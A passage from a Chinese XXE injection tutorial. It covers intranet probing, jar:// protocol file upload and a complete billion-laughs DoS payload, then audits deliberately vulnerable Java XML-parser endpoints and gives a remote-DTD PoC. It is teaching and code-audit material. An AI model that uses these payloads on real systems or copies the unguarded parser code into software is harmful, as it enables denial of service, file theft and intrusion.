+<p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p>
+<h3 id="文件上传">文件上传</h3>
+<p>利用Java的<code>jar</code>协议配合file协议</p>
+<p><strong>jar:// 协议的格式：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jar:{url}!{path}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>实例：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jar:http://host/application.jar!/file/within/the/zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">这个 ! 后面就是其需要从中解压出的文件
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等。</p>
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<p>(1) 下载 jar/zip 文件到临时文件中
+(2) 提取出我们指定的文件
+(3) 删除临时文件</p>
+<p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p>
+<p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p>
+<p>可以参考这位师傅的文章：https://xz.aliyun.com/t/3357</p>
+<h3 id="dos-攻击">DoS 攻击</h3>
+<p>其原理是通过不断迭代增大变量的空间，进而导致内存崩溃。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!--?xml version=&#34;1.0&#34; ?--&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE lolz [&lt;!ENTITY lol &#34;lol&#34;&gt;&lt;!ELEMENT lolz (#PCDATA)&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol1 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol2 &#34;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol4 &#34;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol5 &#34;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol6 &#34;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol7 &#34;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;tag&gt;&amp;lol9;&lt;/tag&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="其他payload">其他payload</h3>
+<p>更多payload可参考：<code>https://github.com/payloadbox/xxe-injection-payload-list</code></p>
+<h2 id="代码审计">代码审计</h2>
+<h3 id="xml的常见接口">XML的常见接口</h3>
+<p>解析XML常见的方法有四种，即：DOM、DOM4J、JDOM 和SAX。</p>
+<p>Java中常用以下常见接口来解析XML语言：</p>
+<h4 id="1xmlreader">1.XMLReader</h4>
+<p>当XMLReader使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&#34;/xmlReader/vuln&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">xmlReaderVuln</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WebUtils</span><span class="p">.</span><span class="na">getRequestBody</span><span class="p">(</span><span class="n">request</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">logger</span><span class="p">.</span><span class="na">info</span><span class="p">(</span><span class="n">body</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">XMLReader</span><span class="w"> </span><span class="n">xmlReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLReaderFactory</span><span class="p">.</span><span class="na">createXMLReader</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">xmlReader</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputSource</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringReader</span><span class="p">(</span><span class="n">body</span><span class="p">)));</span><span class="w">  </span><span class="c1">// parse xml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;xmlReader xxe vuln code&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXCEPT</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2saxbuilder">2.SAXBuilder</h4>
+<p>SAXBuilder是一个JDOM解析器 能将路径中的XML文件解析为Document对象</p>
+<p>当SAXBuilder使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞</p>
+<p>需要引入依赖：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.jdom<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jdom<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>1.1.3<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.xxedemo</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.jdom.input.SAXBuilder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.InputSource</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.StringReader</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 编号7089
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JDOMTest</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&#34;/jdomdemo/vul&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">jdomDemo</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取输入流</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">convertStreamToString</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">SAXBuilder</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXBuilder</span><span class="p">();</span><span class="w">   </span><span class="c1">//</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">builder</span><span class="p">.</span><span class="na">build</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputSource</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringReader</span><span class="p">(</span><span class="n">body</span><span class="p">)));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;jdom xxe vuln code&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Error......&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">convertStreamToString</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">InputStream</span><span class="w"> </span><span class="n">is</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">is</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3saxreader">3.SAXReader</h4>
+<p>SAXReader是第三方的库，该类是无回显的</p>
+<p>引入依赖：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;dependency&gt;
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;dom4j&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;dom4j&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">    &lt;version&gt;1.6.1&lt;/version&gt;
+</span></span><span class="line"><span class="cl">&lt;/dependency&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.xxedemo</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.SAXReader</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.InputSource</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.StringReader</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * 编号7089
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DOM4JTest</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&#34;/dom4jdemo/vul&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">dom4jDemo</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//获取输入流</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">convertStreamToString</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">SAXReader</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXReader</span><span class="p">();</span><span class="w">  </span><span class="c1">//创建对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">reader</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputSource</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringReader</span><span class="p">(</span><span class="n">body</span><span class="p">)));</span><span class="w">  </span><span class="c1">//读取，解析</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;DOM4J XXE......&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;EXCEPT ERROR!!!&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">convertStreamToString</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">InputStream</span><span class="w"> </span><span class="n">is</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Scanner</span><span class="p">(</span><span class="n">is</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Poc:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE data [
+</span></span></span><span class="line"><span class="cl"><span class="cp">        &lt;!ENTITY % remote SYSTEM &#34;http://127.0.0.1:8080/xxe.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">        %remote;
+</span></span><span class="line"><span class="cl">        ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;message&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;to&gt;</span>Kobe<span class="nt">&lt;/to&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;from&gt;</span>James<span class="nt">&lt;/from&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;text&gt;</span><span class="ni">&amp;tmp;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/message&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4saxparserfactory">4.SAXParserFactory</h4>
+<p>该类也是JDK内置的类，但他不可回显内容，可借助dnslog平台</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">com</span><span class="p">.</span><span class="nx">example</span><span class="p">.</span><span class="nx">xxedemo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
